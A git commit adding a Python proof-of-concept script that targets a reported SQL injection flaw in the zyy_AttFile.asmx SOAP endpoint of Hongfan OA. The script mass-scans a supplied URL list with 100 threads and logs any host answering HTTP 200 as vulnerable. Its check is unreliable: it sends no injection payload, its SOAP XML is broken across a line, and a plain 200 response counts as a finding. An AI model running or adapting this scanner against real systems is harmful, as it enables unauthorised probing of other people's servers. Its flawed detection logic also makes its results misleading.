4c7deb5051b22c4f93b8f10e3ba40e3459ec6967
CHKer109 <642971737@qq.com>
2024-07-28 16:47:51 +0800

    红帆OA zyy_AttFile.asmx SQL注入漏洞

---
+++ POC_21.py
@@ -0,0 +1,82 @@
+#红帆OA zyy_AttFile.asmx SQL注入漏洞
+
+import requests,sys,argparse,re,json
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+def banner():
+     test="""░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░        ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░       ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        
+░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░ 
+                                                                                                                 ░▒▓█▓▒░                  
+                                                                                                                  ░▒▓██▓▒░                
+
+                                                                                                                                author:CHKer
+                                                                                                                                version:1.0.0 
+                             
+
+ """
+     print(test)
+
+def main():
+    banner()
+    parsers=argparse.ArgumentParser(description='红帆OA zyy_AttFile.asmx SQL注入漏洞')
+    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
+    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
+    args=parsers.parse_args()
+
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        url_list=[]
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp=Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"usag:\n\t python {sys.argv[0]} -h")
+def poc(target):
+    
+    payload="/ioffice/prg/interface/zyy_AttFile.asmx"
+
+    headers={
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Version/12.0.3 Safari/605.1.15',
+        'Content-Length': '383',
+        'Content-Type': 'text/xml; charset=utf-8',
+        'Soapaction': '"http://tempuri.org/GetFileAtt"',
+        'Accept-Encoding': 'gzip, deflate',
+        'Connection': 'close'
+    }
+    proxies =  {
+        'http':'http://127.0.0.1:8080',
+        'https':'http://127.0.0.1:8080'
+    }
+    data = """<?xml version="1.0" encoding="utf-8"?><soap:Envelope
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt
+xmlns="http://tempuri.org/"><fileName>123</fileName></GetFileAtt> </soap:Body></so
+ap:Envelope>"""
+    try:
+        res1=requests.post(url=target+payload,headers=headers,verify=False,data=data,proxies=proxies)
+
+        if res1.status_code==200:
+                    print(f"[+]目标存在 {target}")
+                    with open('result21.txt','a') as f:
+                        f.write(target+'\n')
+        else:
+             print(f'[-]目标不存在漏洞 {target}')
+    except:
+        pass
+
+
+if __name__ == '__main__':
+    main()
+
